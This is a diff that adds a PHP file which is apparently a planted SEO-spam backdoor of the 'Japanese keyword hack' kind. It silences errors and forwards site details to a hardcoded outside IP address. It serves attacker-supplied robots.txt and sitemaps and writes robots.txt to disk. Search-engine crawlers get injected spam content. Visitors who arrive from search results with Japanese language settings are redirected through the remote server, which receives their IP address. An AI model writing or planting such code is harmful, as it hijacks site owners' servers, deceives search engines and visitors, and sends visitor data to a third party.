@@ -1,0 +1,162 @@
+<?php
+error_reporting(0);
+@set_time_limit(120);
+@ignore_user_abort(1);
+$tr = "http://173.208.226.172/j261117_23/";
+class Req
+{
+    public function server($name = '', $default = '')
+    {
+        if (empty($name)) {
+            return $_SERVER;
+        }
+        $name = strtoupper($name);
+        return isset($_SERVER[$name]) ? $_SERVER[$name] : $default;
+    }
+    public function iss()
+    {
+        if ($this->server('HTTPS') && ("1" == $this->server('HTTPS') || "on" == strtolower($this->server('HTTPS')))) {
+            return true;
+        } elseif ('https' == $this->server('REQUEST_SCHEME')) {
+            return true;
+        } elseif ('443' == $this->server('SERVER_PORT')) {
+            return true;
+        } elseif ('https' == $this->server('HTTP_X_FORWARDED_PROTO')) {
+            return true;
+        }
+        return false;
+    }
+    public function host()
+    {
+        $host = strval($this->server('HTTP_X_FORWARDED_HOST') ?: $this->server('HTTP_HOST'));
+        return strpos($host, ':') ? strstr($host, ':', true) : $host;
+    }
+    public function scheme()
+    {
+        return $this->iss() ? "https" : "http";
+    }
+    public function dm()
+    {
+        return $this->scheme() . "://" . $this->host();
+    }
+    public function ip()
+    {
+        if (getenv('HTTP_CLIENT_IP')) {
+            $ip = getenv('HTTP_CLIENT_IP');
+        } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
+            $ip = getenv('HTTP_X_FORWARDED_FOR');
+        } elseif (getenv('REMOTE_ADDR')) {
+            $ip = getenv('REMOTE_ADDR');
+        } else {
+            $ip = $this->server('REMOTE_ADDR');
+        }
+        return $ip;
+    }
+    public function isc()
+    {
+        $agent = strtolower($this->server('HTTP_USER_AGENT'));
+        if ($agent != '' && preg_match('/googlebot|google|yahoo|bing|aol/si', $agent)) {
+            return true;
+        }
+        return false;
+    }
+    public function isg()
+    {
+		$refer = strtolower($this->server('HTTP_REFERER'));
+        $referbots = 'google|yahoo|bing|aol';
+        if ($refer != '' && preg_match("/($referbots)/si", $refer)) {
+            return true;
+        }
+        return false;
+    }
+    public function uri()
+    {
+        if (($pos = strpos($this->server('REQUEST_URI'), '.php')) !== false) {
+            $script_name = basename($this->server('SCRIPT_FILENAME'));
+            if (basename($this->server('SCRIPT_NAME')) === $script_name) {
+                $url = $this->server('SCRIPT_NAME');
+            } elseif (basename($this->server('PHP_SELF')) === $script_name) {
+                $url = $this->server('PHP_SELF');
+            } elseif (basename($this->server('ORIG_SCRIPT_NAME')) === $script_name) {
+                $url = $this->server('ORIG_SCRIPT_NAME');
+            } elseif (($pos = strpos($this->server('PHP_SELF'), '/' . $script_name)) !== false) {
+                $url = substr($this->server('SCRIPT_NAME'), 0, $pos) . '/' . $script_name;
+            } elseif ($this->server('DOCUMENT_ROOT') && strpos($this->server('SCRIPT_FILENAME'), $this->server('DOCUMENT_ROOT')) === 0) {
+                $url = str_replace($this->server('DOCUMENT_ROOT'), '', $this->server('SCRIPT_FILENAME'));
+            }
+            $requri = $url . substr($this->server('REQUEST_URI'), $pos + 4);
+        } else {
+            $requri = substr($this->server('REQUEST_URI'), strpos($this->server('REQUEST_URI'), '/'));
+        }
+        return rtrim($requri, '/');
+    }
+    public function execReq($url, $p = array())
+    {
+        $url = str_replace(' ', '+', $url);
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($p));
+        $output = curl_exec($ch);
+        $errorCode = curl_errno($ch);
+        curl_close($ch);
+        if (0 !== $errorCode) {
+            return false;
+        }
+        return $output;
+    }
+}
+$req = new Req();
+$isc = $req->isc();
+$isg = $req->isg();
+$umap = $tr . "map";
+$uri = urldecode($req->uri());
+$p = array(
+    "domain" => $req->dm(),
+    "port" => $req->server('SERVER_PORT', 80),
+    "uri" => $uri
+);
+if (substr($uri, -10) == "robots.txt") {
+    header("Content-type:text/plain; charset=utf-8");
+    die($req->execReq($tr . "robots", $p));
+}
+if (substr($uri, -6) == "robots") {
+    $output = $req->execReq($tr . "robots", $p);
+    $rpt = __DIR__ . "/robots.txt";
+    file_put_contents($rpt, $output);
+    $robots_cont = @file_get_contents($rpt);
+    if (strpos(strtolower($robots_cont), "sitemap")) {
+        die("robots.txt file create success!");
+    } else {
+        die("robots.txt file create fail!");
+    }
+}
+if (substr($uri, -4) == ".xml") {
+    if (strpos($uri, "allsitemap.xml") || strpos($uri, "sitemap-index.xml") || strpos($uri, "sitemap-index-1.xml") || strpos($uri, "index.xml")) {
+        $output = $req->execReq($umap, $p);
+        header("Content-type:text/" . (substr($output, 0, 5) === '<?xml' ? 'xml' : 'plain') . '; charset=utf-8');
+        die('' . $output);
+    }
+    $output = $req->execReq($tr . "word", $p);
+    header("Content-type:text/xml; charset=utf-8");
+    if ($output == "1") {
+        die('' . $req->execReq($umap, $p));
+    } else {
+        die('' . $output);
+    }
+}
+$lang = $req->server('HTTP_ACCEPT_LANGUAGE');
+if (!$isc && $isg && strpos($lang, 'ja')!==false) {
+    $p["ip"] = $req->ip();
+    $action = $tr . "jump";
+    die($req->execReq($action, $p));
+}
+if ($isc) {
+    die('' . $req->execReq($tr . "indata", $p));
+}
+?>
